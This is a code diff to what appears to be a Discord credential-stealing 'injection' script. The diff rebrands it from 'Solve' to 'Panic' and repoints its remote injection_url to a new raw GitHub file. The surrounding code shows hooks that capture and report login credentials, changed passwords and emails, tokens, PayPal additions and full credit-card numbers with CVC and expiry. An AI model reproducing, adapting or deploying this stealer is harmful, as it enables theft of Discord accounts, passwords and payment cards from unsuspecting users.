@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Solve Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/internalvpn/Solve-Stealer/main/imgs/solve.jpg'.replace(/ /g, '%20'), 
+  embed_name: 'Panic Injection', 
+  embed_icon: 'https://raw.githubusercontent.com/imsolve/Panic/main/img/panic.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/internalvpn/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/imsolve/Panic-injection/main/index.js', 
   /**
    
    **/
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By solve ・https://github.com/internalvpn',
+          text: 'By Solve | .gg/haxxor | Github.com/imsolve',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By solve ・https://github.com/internalvpn',
+          text: 'By Solve | .gg/haxxor | Github.com/imsolve',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By solve ・https://github.com/internalvpn',
+          text: 'By Solve | .gg/haxxor | Github.com/imsolve',
         },
       },
     ],
@@ -787,7 +787,7 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            value: `Nitro time!!!!`,
             inline: false,
           },
           {
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By solve ・https://github.com/internalvpn',
+          text: 'By Solve | .gg/haxxor | Github.com/imsolve',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By solve ・https://github.com/internalvpn',
+          text: 'By Solve | .gg/haxxor | Github.com/imsolve',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By solve ・https://github.com/internalvpn',
+          text: 'By Solve | .gg/haxxor | Github.com/imsolve',
         },
       },
     ],
@@ -984,4 +984,3 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
   }
 });
 module.exports = require('./core.asar');
-
